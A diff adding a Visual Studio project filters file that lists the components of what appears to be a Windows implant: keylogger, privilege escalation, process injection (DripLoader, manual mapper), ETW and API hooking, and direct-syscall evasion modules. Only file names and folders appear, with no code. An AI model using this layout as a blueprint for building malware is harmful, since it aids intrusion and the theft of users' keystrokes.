@@ -1,0 +1,167 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="Header Files\Evasion">
+      <UniqueIdentifier>{20424aac-1e53-4cda-83ec-487bd28655dd}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Evasion">
+      <UniqueIdentifier>{93d8471c-1f7e-4c60-9851-df6e730aae96}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Features">
+      <UniqueIdentifier>{9f1f081d-8a9c-45bd-b887-752f22da15e9}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Escalation">
+      <UniqueIdentifier>{8f93fc26-ec18-44c0-882f-3077f59979ed}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Escalation">
+      <UniqueIdentifier>{50c8d1f3-aa36-4314-8a6e-e82e74595736}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\Injection">
+      <UniqueIdentifier>{3be5ab50-852d-4fc5-971b-9d0cbfe4bb07}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Injection">
+      <UniqueIdentifier>{791663c3-83ff-4ef1-b993-04225926991e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\ErrorHandler">
+      <UniqueIdentifier>{a92402b9-69f5-4614-b5ec-7ef0ba9c839f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\ErrorHandler">
+      <UniqueIdentifier>{0eeff8a5-6efe-4b88-87d6-23bfb03aad7e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Features">
+      <UniqueIdentifier>{2999c506-9206-43d9-afbd-23fb0e70b0ec}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="Source.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="MyClient.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="CMD.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="Sync.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="ErrorLogger.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="Util.cpp">
+      <Filter>Source Files\Evasion</Filter>
+    </ClCompile>
+    <ClCompile Include="HookETW.cpp">
+      <Filter>Source Files\Evasion</Filter>
+    </ClCompile>
+    <ClCompile Include="DumpVEHs.cpp">
+      <Filter>Source Files\Evasion</Filter>
+    </ClCompile>
+    <ClCompile Include="HookAPI.cpp">
+      <Filter>Source Files\Evasion</Filter>
+    </ClCompile>
+    <ClCompile Include="Keylogger.cpp">
+      <Filter>Source Files\Features</Filter>
+    </ClCompile>
+    <ClCompile Include="Escalation.cpp">
+      <Filter>Source Files\Escalation</Filter>
+    </ClCompile>
+    <ClCompile Include="DripLoader.cpp">
+      <Filter>Source Files\Injection</Filter>
+    </ClCompile>
+    <ClCompile Include="Mapper.cpp">
+      <Filter>Source Files\Injection</Filter>
+    </ClCompile>
+    <ClCompile Include="ErrorHandler.cpp">
+      <Filter>Source Files\ErrorHandler</Filter>
+    </ClCompile>
+    <ClCompile Include="syscalls_all.c">
+      <Filter>Source Files\Evasion</Filter>
+    </ClCompile>
+    <ClCompile Include="Helpers.cpp">
+      <Filter>Source Files\Injection</Filter>
+    </ClCompile>
+    <ClCompile Include="klg.cpp">
+      <Filter>Source Files\Features</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="MyClient.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="CMD.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="Sync.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="IncludeMe.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ErrorLogger.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="LazyImporter.hpp">
+      <Filter>Header Files\Evasion</Filter>
+    </ClInclude>
+    <ClInclude Include="MinHook.h">
+      <Filter>Header Files\Evasion</Filter>
+    </ClInclude>
+    <ClInclude Include="Utils.hpp">
+      <Filter>Header Files\Evasion</Filter>
+    </ClInclude>
+    <ClInclude Include="DumpVEHs.hpp">
+      <Filter>Header Files\Evasion</Filter>
+    </ClInclude>
+    <ClInclude Include="HookETW.hpp">
+      <Filter>Header Files\Evasion</Filter>
+    </ClInclude>
+    <ClInclude Include="Evasion.hpp">
+      <Filter>Header Files\Evasion</Filter>
+    </ClInclude>
+    <ClInclude Include="Escalation.hpp">
+      <Filter>Header Files\Escalation</Filter>
+    </ClInclude>
+    <ClInclude Include="Mapper.hpp">
+      <Filter>Header Files\Injection</Filter>
+    </ClInclude>
+    <ClInclude Include="ErrorHandler.hpp">
+      <Filter>Header Files\ErrorHandler</Filter>
+    </ClInclude>
+    <ClInclude Include="syscalls_all.h">
+      <Filter>Header Files\Evasion</Filter>
+    </ClInclude>
+    <ClInclude Include="DripLoader.h">
+      <Filter>Header Files\Injection</Filter>
+    </ClInclude>
+    <ClInclude Include="NtThings.h">
+      <Filter>Header Files\Injection</Filter>
+    </ClInclude>
+    <ClInclude Include="BCKeylogger.hpp">
+      <Filter>Header Files\Features</Filter>
+    </ClInclude>
+    <ClInclude Include="klg.hpp">
+      <Filter>Header Files\Features</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <MASM Include="syscalls_all_-asm.x64.asm">
+      <Filter>Source Files\Evasion</Filter>
+    </MASM>
+    <MASM Include="NtdllWinX.asm">
+      <Filter>Source Files\Injection</Filter>
+    </MASM>
+  </ItemGroup>
+</Project>
